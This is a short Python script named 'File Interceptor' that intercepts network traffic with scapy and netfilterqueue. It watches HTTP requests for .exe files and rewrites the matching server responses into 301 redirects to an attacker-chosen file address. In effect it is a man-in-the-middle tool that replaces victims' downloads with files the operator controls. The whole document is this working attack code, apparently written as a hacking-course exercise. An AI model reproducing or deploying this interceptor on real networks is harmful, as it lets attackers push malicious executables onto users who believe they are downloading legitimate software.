#!/usr/bin/env python

import scapy.all as scapy
import netfilterqueue
import optparse
import queue
queue = queue.Queue()

ack_list = []

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-f", "--file-address", dest="address", help="Target File Address")
    (options, arguments) = parser.parse_args()

    if not options.address:
        parser.error("[-] Please specify target File Address , use --help for more.")
    return options


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packets(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
        if scapy_packet[scapy.TCP].dport == 80:
            # print("HTTP Request")
            if ".exe" in scapy_packet[scapy.Raw].load:
                #and "192.168.43.128" not in scapy_packet[scapy.Raw].load
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print("[+] exe Request")
        elif scapy_packet[scapy.TCP].sport == 80:
            # print("HTTP Response")
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                # print(scapy_packet.show())
                modified_packet = set_load(scapy_packet, "\nHTTP/1.1 301 Moved Permanently\nLocation: " + options.address + "\n\n")

                packet.set_payload(str(modified_packet))

    packet.accept()


options = get_arguments()
print("File Interceptor\n\t-Alrocks29")
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packets)
    queue.run()

except KeyboardInterrupt:
    print ("\n[-] Quitting.................")
